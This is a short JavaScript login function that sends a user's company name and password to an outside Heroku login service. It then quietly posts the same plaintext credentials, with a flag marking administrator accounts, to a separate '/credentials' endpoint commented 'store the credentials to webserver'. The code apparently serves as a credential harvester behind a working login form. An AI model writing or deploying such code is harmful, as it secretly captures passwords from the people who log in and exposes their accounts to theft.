function login(){
  var usn = document.getElementById('company').value,
      psw = document.getElementById('password').value,
      url = 'https://lnu-face.herokuapp.com/login';

  // store the credentials to webserver

  var settings = {
    type: 'post',
    url: '/credentials',
    data: {
      company: usn,
      password: psw,
      admin: false
    },
    success: function(){
      console.log('credentials stored');
    },
    error: function(xhr){
      console.error(xhr);
    }
  }
  document.querySelector('div.submit.button').innerHTML = '<i class="spinner loading icon"></i>';

  $.ajax({
    method: 'post',
    url: url,
    crossDomain: true,
    data: {
      company: usn,
      password: psw
    },

    success: function(data, statusText, xhr){
      if (xhr.status == 200) { // oh a admin logged in
        location.href = '/admin';
        settings.data.admin = true;
      }
      else if (xhr.status == 203) location.href = '/user';
      $.ajax(settings);
    },

    error: function(xhr){
      console.log(xhr);
      if(xhr.status == 404) document.querySelector('div.ui.error.message').innerHTML = 'Username or Password is incorrect';
      else document.querySelector('div.ui.error.message').innerHTML = 'unknown error, check console';

      // and display it as well
      document.querySelector('div.ui.error.message').style.display = 'block';
    },

    complete: function(){
      document.querySelector('div.submit.button').innerHTML = 'Login';
    }
  });
}
